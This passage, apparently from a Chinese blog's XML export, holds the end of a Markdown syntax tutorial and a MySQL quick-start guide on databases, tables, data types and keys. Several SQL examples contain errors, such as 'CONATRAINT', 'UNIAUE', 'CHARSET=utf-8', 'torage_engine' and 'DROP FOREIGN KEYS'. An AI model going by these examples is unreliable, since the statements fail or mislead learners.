class="attr">face</span>=<span class="string">&quot;黑体&quot;</span>&gt;</span></span>黑体字<span class="xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">#00ffff</span> <span class="attr">size</span>=<span class="string">3</span>&gt;</span></span>null<span class="xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">gray</span> <span class="attr">size</span>=<span class="string">5</span>&gt;</span></span>gray<span class="xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<font face="黑体">我是黑体字</font>
<font face="微软雅黑">我是微软雅黑</font>
<font face="STCAIYUN">我是华文彩云</font>
<font color="#ff0000" size="12" face="黑体">黑体字</font>
<font color="#00ffff" size="3">null</font>
<font color="gray" size="5">gray</font>

<hr>
<p><a href="http://tool.oschina.net/commons?type=3">RGB颜色对照表</a></p>
<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><h2 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h2><p>使用<code>+</code>、<code>-</code>、<code>*</code>加一个空格，然后跟上文字就会自动生成列表</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">//形式一</span><br><span class="line"><span class="bullet">+</span> a</span><br><span class="line"><span class="bullet">+</span> b</span><br><span class="line"><span class="bullet">+</span> c</span><br><span class="line"></span><br><span class="line">//形式二</span><br><span class="line"><span class="bullet">-</span> d</span><br><span class="line"><span class="bullet">-</span> e</span><br><span class="line"><span class="bullet">-</span> f</span><br><span class="line"></span><br><span class="line">//形式三</span><br><span class="line"><span class="bullet">*</span> g</span><br><span class="line"><span class="bullet">*</span> h</span><br><span class="line"><span class="bullet">*</span> i</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<p>//形式一</p>
<ul>
<li>a</li>
<li>b</li>
<li>c</li>
</ul>
<p>//形式二</p>
<ul>
<li>d</li>
<li>e</li>
<li>f</li>
</ul>
<p>//形式三</p>
<ul>
<li>g</li>
<li>h</li>
<li>i</li>
</ul>
<hr>
<h3 id="二级列表"><a href="#二级列表" class="headerlink" title="二级列表"></a>二级列表</h3><p>在列表下一行前加两个空格即可生成二级列表</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line"><span class="bullet">+</span> 123</span><br><span class="line"><span class="bullet">    +</span> abc</span><br><span class="line"><span class="bullet">    +</span> bcd</span><br><span class="line"><span class="bullet">    +</span> cde</span><br><span class="line"><span class="bullet">+</span> 456</span><br><span class="line"><span class="bullet">+</span> 789</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<ul>
<li>123<ul>
<li>abc</li>
<li>bcd</li>
<li>cde</li>
</ul>
</li>
<li>465</li>
<li>789</li>
</ul>
<hr>
<h2 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h2><p>数字加<code>.</code>和一个空格，即可生成有序列表</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> abc</span><br><span class="line"><span class="bullet">2.</span> bcd</span><br><span class="line"><span class="bullet">3.</span> cde</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<ol>
<li>abc</li>
<li>bcd</li>
<li>cde</li>
</ol>
<hr>
<h3 id="二级列表-1"><a href="#二级列表-1" class="headerlink" title="二级列表"></a>二级列表</h3><p>在列表下一行前加两个空格即可生成二级列表</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> abcd</span><br><span class="line"><span class="bullet">    1.</span> abcde</span><br><span class="line"><span class="bullet">    2.</span> abcde</span><br><span class="line"><span class="bullet">    3.</span> abcde</span><br><span class="line"><span class="bullet">2.</span> bcde</span><br><span class="line"><span class="bullet">3.</span> cdef</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<ol>
<li>abcd<ol>
<li>abcde</li>
<li>abcde</li>
<li>abcde</li>
</ol>
</li>
<li>bcde</li>
<li>cdef</li>
</ol>
<hr>
<h2 id="嵌套列表"><a href="#嵌套列表" class="headerlink" title="嵌套列表"></a>嵌套列表</h2><figure class="highlight md"><table><tr><td class="code"><pre><span class="line">//无序列表嵌套</span><br><span class="line"><span class="bullet">+</span> 123</span><br><span class="line"><span class="bullet">    +</span> abc</span><br><span class="line"><span class="bullet">    1.</span> bcd</span><br><span class="line"><span class="bullet">    2.</span> cde</span><br><span class="line"><span class="bullet">+</span> 465</span><br><span class="line"><span class="bullet">+</span> 789</span><br><span class="line"></span><br><span class="line">//有序列表嵌套</span><br><span class="line"><span class="bullet">1.</span> abcd</span><br><span class="line"><span class="bullet">    -</span> abcde</span><br><span class="line"><span class="bullet">    -</span> abcde</span><br><span class="line"><span class="bullet">    1.</span> abcde</span><br><span class="line"><span class="bullet">2.</span> bcde</span><br><span class="line"><span class="bullet">3.</span> cdef</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<p>//无序列表嵌套</p>
<ul>
<li>123<ul>
<li>abc</li>
</ul>
<ol>
<li>bcd</li>
<li>cde</li>
</ol>
</li>
<li>465</li>
<li>789</li>
</ul>
<p>//有序列表嵌套</p>
<ol>
<li>abcd<ul>
<li>abcde</li>
<li>abcde</li>
</ul>
<ol>
<li>abcde</li>
</ol>
</li>
<li>bcde</li>
<li>cdef</li>
</ol>
<hr>
<h1 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h1><h2 id="少量代码"><a href="#少量代码" class="headerlink" title="少量代码"></a>少量代码</h2><p>用`包裹起来的部分</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">这是<span class="code">`一点代码`</span></span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<p>这是<code>`一点代码</code></p>
<hr>
<h2 id="大量代码"><a href="#大量代码" class="headerlink" title="大量代码"></a>大量代码</h2><p>用```包裹的部分，<strong>下面为了能在代码块中显示```加了<code>\</code>，实际没有<code>\</code></strong></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">\<span class="code">```</span></span><br><span class="line"><span class="code">大量代码内容</span></span><br><span class="line"><span class="code">大量代码内容</span></span><br><span class="line"><span class="code">大量代码内容</span></span><br><span class="line"><span class="code">\```</span></span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">大量代码内容</span><br><span class="line">大量代码内容</span><br><span class="line">大量代码内容</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="引用块"><a href="#引用块" class="headerlink" title="引用块"></a>引用块</h1><p><code>&gt;</code>加空格，跟上文字即代表引用块</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line"><span class="quote">&gt; 一级引用</span></span><br><span class="line">&gt;&gt; 二级引用</span><br><span class="line">&gt;&gt;&gt; 三级引用</span><br><span class="line">&gt;&gt;&gt;&gt; 四级引用</span><br><span class="line">&gt;&gt;&gt;&gt;&gt; 五级引用</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt; 六级引用</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<blockquote>
<p>一级引用</p>
<blockquote>
<p>二级引用</p>
<blockquote>
<p>三级引用</p>
<blockquote>
<p>四级引用</p>
<blockquote>
<p>五级引用</p>
<blockquote>
<p>六级引用</p>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
<hr>
<h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p>链接的文字放在[]中，链接地址放在随后的()中，链接也可以带title属性，链接地址后面空一格，然后用引号引起来，<strong>引号的内容不是必须的</strong></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">//行内式</span><br><span class="line">[<span class="string">我的博客</span>](<span class="link">https://eonun.com &quot;欢迎访问&quot;</span>)来看看吧</span><br><span class="line">//参数式</span><br><span class="line">[<span class="symbol">我的博客</span>]: <span class="link">https://eonun.com &quot;欢迎访问&quot;</span></span><br><span class="line">[我的博客]来看看吧</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<p>//行内式<br><a href="https://eonun.com" title="欢迎访问">我的博客</a>来看看吧<br>//参数式</p>
<p><a href="https://eonun.com" title="欢迎访问">我的博客</a>来看看吧</p>
<hr>
<h1 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h1><p>和链接的形式差不多，图片的名字放在[]中，图片地址放在随后的()中，title属性（图片地址后面空一格，然后用引号引起来<strong>引号的内容不是必须的</strong>）,注意的是[]前要加上!</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">//行内式</span><br><span class="line">![<span class="string">我的头像</span>](<span class="link">https://eonun.com/images/me.png &quot;me&quot;</span>)</span><br><span class="line"></span><br><span class="line">//参数式</span><br><span class="line">[<span class="symbol">我的头像</span>]: <span class="link">https://eonun.com/images/me.png &quot;me&quot;</span></span><br><span class="line">![我的头像]</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<p>//行内式<br><img data-src="https://eonun.com/images/me.png" alt="我的头像" title="me"><br>//参数式</p>
<p><img data-src="https://eonun.com/images/me.png" alt="我的头像" title="me"></p>
<hr>
<h1 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h1><p>分割线可以由* - _（星号，减号，底线）这3个符号的至少3个符号表示，注意至少要3个，且不需要连续，有空格也可以</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line"><span class="bullet">-</span> - -</span><br><span class="line">------</span><br><span class="line"><span class="strong">**<span class="emphasis">*</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">*</span> <span class="emphasis">* *</span></span></span><br><span class="line"><span class="strong">**</span><span class="strong">****</span></span><br><span class="line"><span class="strong">__<span class="emphasis">_</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">_</span> <span class="emphasis">_ _</span></span></span><br><span class="line"><span class="strong">__</span><span class="strong">____</span></span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<hr>
<h2 id><a href="#" class="headerlink" title="- - -"></a>- - -</h2><hr>
<hr>
<hr>
<hr>
<hr>
<hr>
<hr>
<h1 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h1><p><strong>分割线后面的冒号表示对齐方式，写在左边表示左对齐，右边为右对齐，两边都写表示居中</strong></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">//例子一</span><br><span class="line">|123|234|345|</span><br><span class="line">|:--|:--:|--:|</span><br><span class="line">|abc|bcd|cde|</span><br><span class="line">|abc|bcd|cde|</span><br><span class="line">|abc|bcd|cde|</span><br><span class="line">//例子二</span><br><span class="line">|123|234|345|</span><br><span class="line">|:---|:---:|---:|</span><br><span class="line">|abc|bcd|cde|</span><br><span class="line">|abc|bcd|cde|</span><br><span class="line">|abc|bcd|cde|</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<p>//例子一<br>|123|234|345|<br>|:—|:—:|—:|<br>|abc|bcd|cde|<br>|abc|bcd|cde|<br>|abc|bcd|cde|<br>//例子二<br>|123|234|345|<br>|:—|:—:|—:|<br>|abc|bcd|cde|<br>|abc|bcd|cde|<br>|abc|bcd|cde|</p>
<hr>
<h1 id="短路缩进（空格）"><a href="#短路缩进（空格）" class="headerlink" title="短路缩进（空格）"></a>短路缩进（空格）</h1><figure class="highlight md"><table><tr><td class="code"><pre><span class="line">半方大的空白&amp;#8194;看，飞碟</span><br><span class="line">全方大的空白&amp;#8195;看，飞碟</span><br><span class="line">不断行的空白格&amp;#160;看，飞碟</span><br><span class="line">  段落从此开始。</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<p>半方大的空白&#8194;看，飞碟<br>全方大的空白&#8195;看，飞碟<br>不断行的空白格&#160;看，飞碟<br>  段落从此开始。</p>
<hr>
<h1 id="页面内跳转"><a href="#页面内跳转" class="headerlink" title="页面内跳转"></a>页面内跳转</h1><p><strong>通过在标签中使用id定义锚点然后跳转</strong></p>
<p><strong>先定义跳转锚点</strong></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">//通过span标签</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span> = <span class="string">&quot;a&quot;</span>&gt;</span></span>锚点<span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">//通过h标签</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span> = <span class="string">&quot;1&quot;</span>&gt;</span></span>锚点<span class="xml"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">id</span> = <span class="string">&quot;anchor&quot;</span>&gt;</span></span>锚点<span class="xml"><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><strong>跳转</strong></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">[<span class="string">回到顶部</span>](<span class="link">#a</span>)</span><br><span class="line">[<span class="string">回到顶部</span>](<span class="link">#1</span>)</span><br><span class="line">[<span class="string">回到顶部</span>](<span class="link">#anchor</span>)</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>效果</strong>：</p>
<p><a href="#a">回到顶部</a></p>
<hr>
]]></content>
      <categories>
        <category>Markdown</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL快速入门</title>
    <url>/posts/120a3d84/</url>
    <content><![CDATA[<h1 id="什么是SQL"><a href="#什么是SQL" class="headerlink" title="什么是SQL"></a>什么是SQL</h1><p>SQL (Structured Query Language) 译为结构化查询语言，是一种在数据库管理系统(RDBMS,Relational Database Management System) 中查询数据，或通过 RDBMS 对数据库中的数据进行修改的语言。</p>
<p>常见 RDBMS ：</p>
<ul>
<li>Oracle Database : 甲骨文的</li>
<li>SQL Server : 微软的</li>
<li>DB2 : IBM的</li>
<li>PostgreSQL : 开源</li>
<li>MySQL : 开源</li>
<li>MariaDB : MySQL的一个分支,甲骨文收购MySQL后，有将MySQL闭源的潜在风险，因此社区采用分支的方式来避开这个风险</li>
</ul>
<p>不同 RDBMS 略有不同，由于 MySQL 是开源的,可免费获取，很多大企都在使用 MySQL ,所以本文将以 MySQL 的 SQL 对 SQL 进行讲解。</p>
<p>SQL 的查询过程是: 用户在客户端通过 SQL 语句，将需要的数据或对数据进行的操作请求发送给 RDBMS ，RDBMS 根据语句内容返回请求的数据，或对存储在数据库中的数据进行更新。</p>
<a id="more"></a>
<h2 id="SQL-语句分类"><a href="#SQL-语句分类" class="headerlink" title="SQL 语句分类"></a>SQL 语句分类</h2><ul>
<li><p>DDL (Dtaa Definition Language , 数据定义语句) :</p>
<p>  用于创建修改删除存储在数据库中的数据库、表等对象</p>
<ul>
<li><code>CREATE</code> (创建) : 创建数据库或表等对象</li>
<li><code>DROP</code> (撤销) : 删除数据库或表等对象</li>
<li><code>ALTER</code> (更改) : 修改数据库或表等对象的结构</li>
</ul>
</li>
<li><p>DML (Data Manipulation Language , 数据操作语句) :</p>
<p>  用于查询或更改表中的记录</p>
<ul>
<li><code>SELECT</code> (筛选) : 查询表中的数据</li>
<li><code>INSERT</code> (插入) : 向表中插入新数据</li>
<li><code>UPDATE</code> (更新) : 更新表中数据</li>
<li><code>DELETE</code> (删除) : 删除表中数据</li>
</ul>
</li>
<li><p>DCL (Data Control Language , 数据控制语句) :</p>
<p>  用于确认或取消数据库中的数据进行的变更。还可对 RDBMS 的用户访问数据库中对象的权限进行设定</p>
<ul>
<li><code>COMMIT</code> (承诺) : 确认对数据库中数据的变更</li>
<li><code>ROLLBACK</code> (回滚) : 取消对数据库中数据的变更</li>
<li><code>GRANT</code> (授予) : 赋予用户操作权限</li>
<li><code>REVOKE</code> (撤销) : 取消用户的操作权限</li>
</ul>
</li>
</ul>
<p>某些数据库系统要求每条语句末端使用分号，用于分隔每条语句。</p>
<h1 id="MySQL-基本操作"><a href="#MySQL-基本操作" class="headerlink" title="MySQL 基本操作"></a>MySQL 基本操作</h1><h2 id="查看-MySQL-版本-SELECT-VERSION"><a href="#查看-MySQL-版本-SELECT-VERSION" class="headerlink" title="查看 MySQL 版本 SELECT VERSION();"></a>查看 <code>MySQL</code> 版本 <code>SELECT VERSION();</code></h2><h2 id="显示当前登录用户-SELECT-CURRENT-USER"><a href="#显示当前登录用户-SELECT-CURRENT-USER" class="headerlink" title="显示当前登录用户 SELECT CURRENT_USER();"></a>显示当前登录用户 <code>SELECT CURRENT_USER();</code></h2><h1 id="数据库基本操作"><a href="#数据库基本操作" class="headerlink" title="数据库基本操作"></a>数据库基本操作</h1><h2 id="CREATE-创建数据库"><a href="#CREATE-创建数据库" class="headerlink" title="CREATE 创建数据库"></a><code>CREATE</code> 创建数据库</h2><p><code>CREATE DATABASE [IF NOT EXISTS] 库名;</code></p>
<ul>
<li><code>DATABASE</code> : 数据库</li>
<li><code>EXISTS</code> : 存在</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> d_name;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> d_name;</span><br></pre></td></tr></table></figure>
<h2 id="DROP-DATABASE-删除数据库"><a href="#DROP-DATABASE-删除数据库" class="headerlink" title="DROP DATABASE 删除数据库"></a><code>DROP DATABASE</code> 删除数据库</h2><p><code>DROP DATABASE 库名;</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> d_name;</span><br></pre></td></tr></table></figure>
<h2 id="USE-选择数据库"><a href="#USE-选择数据库" class="headerlink" title="USE 选择数据库"></a><code>USE</code> 选择数据库</h2><p><code>USE 库名;</code></p>
<ul>
<li><code>USE</code> : 使用</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">USE</span> d_name;</span><br></pre></td></tr></table></figure>
<h2 id="SHOW-TABLES-查询数据库中的表"><a href="#SHOW-TABLES-查询数据库中的表" class="headerlink" title="SHOW TABLES; 查询数据库中的表"></a><code>SHOW TABLES;</code> 查询数据库中的表</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">TABLES</span>;</span><br></pre></td></tr></table></figure>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h2 id="设置编码"><a href="#设置编码" class="headerlink" title="设置编码"></a>设置编码</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">NAMES</span> utf8;</span><br></pre></td></tr></table></figure>
<p>用于设置编码，可以再在建数据库的时候设置，也可以在创建表的时候设置。</p>
<h3 id="查看MySQL存储引擎"><a href="#查看MySQL存储引擎" class="headerlink" title="查看MySQL存储引擎"></a>查看MySQL存储引擎</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">ENGINES</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>SHOW</code> : 显示</li>
<li><code>ENGINES</code> : 引擎</li>
</ul>
<p>该语句可用 <code>;</code> 结束，也用 <code>\g</code> 或 <code>\G</code> 结束。<code>\g</code>与 <code>;</code> 的作用相同，<code>\G</code> 可以让结果显示得更加美观。</p>
<h3 id="查询MySQL支持的存储引擎"><a href="#查询MySQL支持的存储引擎" class="headerlink" title="查询MySQL支持的存储引擎"></a>查询MySQL支持的存储引擎</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">VARIABLES</span> <span class="keyword">LIKE</span> <span class="string">&#x27;have%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>VARIABLES</code> : 变量</li>
<li><code>LIKE</code> : 如同</li>
</ul>
<h3 id="查询默认存储引擎"><a href="#查询默认存储引擎" class="headerlink" title="查询默认存储引擎"></a>查询默认存储引擎</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">VARIABLES</span> <span class="keyword">LIKE</span> <span class="string">&#x27;torage_engine&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>常用存储引擎：<code>InnoDB</code>、<code>MyISAM</code>、<code>MEMORY</code></p>
<h1 id="表基础操作"><a href="#表基础操作" class="headerlink" title="表基础操作"></a>表基础操作</h1><p>先使用 <code>USE 库名;</code> 选择需要操作的数据库</p>
<p><strong><code>SHOW TABLE;</code> 查询数据库中的表</strong></p>
<ul>
<li><code>TABLE</code> : 表格</li>
</ul>
<h2 id="CREATE-TABLE-创建表"><a href="#CREATE-TABLE-创建表" class="headerlink" title="CREATE TABLE 创建表"></a><code>CREATE TABLE</code> 创建表</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] 表名(</span><br><span class="line">字段名 数据类型 约束条件 [<span class="keyword">COMMENT</span> ‘描述’],</span><br><span class="line">字段名 数据类型 约束条件 [<span class="keyword">COMMENT</span> ‘描述’],</span><br><span class="line">……</span><br><span class="line">字段名 数据类型 约束条件 [<span class="keyword">COMMENT</span> ‘描述’],</span><br><span class="line">[表约束]</span><br><span class="line">)<span class="keyword">ENGINE</span>=引擎 [<span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=字符集];</span><br></pre></td></tr></table></figure>
<ul>
<li>常用数据类型:</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>大小</th>
<th>用途</th>
</tr>
</thead>
<tbody>
<tr>
<td>INT/INTEGER</td>
<td>4 字节</td>
<td>大整数值</td>
</tr>
<tr>
<td>FLOAT</td>
<td>4 字节</td>
<td>单精度浮点数</td>
</tr>
<tr>
<td>DOUBLE</td>
<td>8 字节</td>
<td>双精度浮点数</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>常用日期和时间类型</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>大小</th>
<th>用途</th>
</tr>
</thead>
<tbody>
<tr>
<td>DATE</td>
<td>3 字节</td>
<td>日期值</td>
</tr>
<tr>
<td>DATETIME</td>
<td>8 字节</td>
<td>混合日期和时间值</td>
</tr>
<tr>
<td>TIMESTAMP</td>
<td>4 字节</td>
<td>混合日期和时间值，时间戳</td>
</tr>
<tr>
<td>TIME</td>
<td>3 字节</td>
<td>时间值或持续时间</td>
</tr>
<tr>
<td>YEAR</td>
<td>1 字节</td>
<td>年份值</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><code>TIMESTAMP</code> : 时间戳</li>
</ul>
<ul>
<li>常用字符串类型</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>大小</th>
<th>用途</th>
</tr>
</thead>
<tbody>
<tr>
<td>CHAR(M)</td>
<td>0~255 字节,M个字符</td>
<td>定长字符串</td>
</tr>
<tr>
<td>VARCHAR(M)</td>
<td>0~65535 字节,M个字符</td>
<td>变长字符串</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><code>CHAR</code> : 字符</li>
<li><code>VARCHAR</code> : 文本</li>
</ul>
<ul>
<li>常用约束条件</li>
</ul>
<p><code>UNIAUE</code> | <code>PRIMARY KEY</code> | <code>FOREIGN KEY</code> | <code>NOT NULL</code> | <code>NULL</code></p>
<ul>
<li><code>UNIAUE</code> : 唯一</li>
<li><code>PRIMARY</code> : 主要</li>
<li><code>FOREIGN</code> : 外部</li>
</ul>
<ul>
<li>表约束: 主键约束 , 外键约束</li>
</ul>
<p>主键和外键起约束作用：<br>主键标识记录为唯一性，不能有重复，不允许为空，用于保证数据完整性，主键只能有一个<br>外键是另一表中的主键，可有重复，可为空，用于与其他表建立联系，可有多个外键</p>
<p>主键能确定一条记录的唯一标识，如一条记录包括身份证号、姓名、年龄，身份证是唯一确认这个人的，其他的都可能有重复，所以这里的身份证号就是主键。</p>
<p>外键用于与另一表关联，是能确认另一张表记录的字段，用于保持数据的一致性。如 A 表中的字段是 B 表中的主键，那它就是可以是 A 表的外键。</p>
<p>索引字段没有重复值，可为空，用于提供查询排序的速度，可有多个唯一索引。</p>
<ul>
<li><p>主键约束: <code>[CONATRAINT [描述字符]] PRIMARY KEY (字段名)</code></p>
<ul>
<li><code>CONATRAINT</code> : 约束</li>
</ul>
<p>创建数据表并设置 <code>A_no</code> 为主键</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> t_name_A(</span><br><span class="line">A_no <span class="built_in">CHAR</span>(<span class="number">9</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">&#x27;学号&#x27;</span>,</span><br><span class="line">A_name <span class="built_in">VARCHAR</span>(<span class="number">10</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">A_sex <span class="built_in">CHAR</span>(<span class="number">2</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">&#x27;性别&#x27;</span>,</span><br><span class="line">A_age <span class="built_in">DATE</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">&#x27;年龄&#x27;</span>,</span><br><span class="line">A_dept <span class="built_in">VARCHAR</span>(<span class="number">8</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">&#x27;系别&#x27;</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (A_no)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf<span class="number">-8</span>;</span><br></pre></td></tr></table></figure>
<pre><code>- `COMMENT` : 注释
- `DEFAULT` : 默认
- `CHARSET` : 字符集
</code></pre><ul>
<li><p>外键表约束 : <code>[CONATRAINT [描述字符]] FOREIGN KEY (外表字段名) REFERENCES 外表名(外表字段名) [ON DELETE|UPDATE 选项]</code></p>
<p>选项: <code>RESTRICT</code> | <code>CASCADE</code> | <code>SET NULL</code> | <code>NO ACTION</code> | <code>SET DEFAULT</code></p>
<ul>
<li><code>RESTRICT</code> : 限制</li>
<li><code>CASCADE</code> : 级联</li>
<li><code>ACTION</code> : 动作</li>
<li><code>REFERENCES</code> : 参考</li>
</ul>
<p>创建表并设置 <code>A_no</code> 字段为外键</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> t_name_B(</span><br><span class="line">A_no <span class="built_in">CHAR</span>(<span class="number">9</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> ‘学号’,</span><br><span class="line">B_no <span class="built_in">CHAR</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> ‘课程编号’,</span><br><span class="line">B_grade <span class="built_in">FLOAT</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> ‘成绩’,</span><br><span class="line">CONATRAINT S_fk <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span>(A_no)</span><br><span class="line"><span class="keyword">REFERENCES</span> t_name_A(A_no)</span><br><span class="line">)<span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf<span class="number">-8</span>;</span><br></pre></td></tr></table></figure>
<h2 id="删除表-没有被关联"><a href="#删除表-没有被关联" class="headerlink" title="删除表(没有被关联)"></a>删除表(没有被关联)</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> 表名;</span><br></pre></td></tr></table></figure>
<h2 id="删除主表-被关联"><a href="#删除主表-被关联" class="headerlink" title="删除主表(被关联)"></a>删除主表(被关联)</h2><ul>
<li>查看副表依附于主表的外键：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 副表名\G;</span><br></pre></td></tr></table></figure>
<ul>
<li>删除副表外键约束</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 副表名 <span class="keyword">DROP</span> <span class="keyword">FOREIGN</span> <span class="keyword">KEYS</span> 外键名;</span><br></pre></td></tr></table></figure>
<ul>
<li>删除主表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> 主表名;</span><br></pre></td></tr></table></figure>
